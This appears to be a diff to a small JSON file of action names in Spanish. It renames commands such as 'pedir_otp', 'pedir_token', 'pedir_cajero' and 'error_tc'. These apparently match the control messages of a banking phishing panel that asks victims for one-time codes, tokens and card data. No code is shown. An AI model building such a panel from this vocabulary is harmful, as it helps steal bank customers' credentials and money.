@@ -1,11 +1,11 @@
 { "accion": "pedir_dinamica" }
 
-{"accion": "ccajero-id"}
+{"accion": "pedir_cajero"}
 
-{"accion": "otp-id"}
+{"accion": "pedir_otp"}
 
-{"accion": "token-id"}
+{"accion": "pedir_token"}
 
-{"accion": "error-ccajero"}
+{"accion": "error_tc"}
 
-{"accion": "error-id"}
+{"accion": "error_logo"}
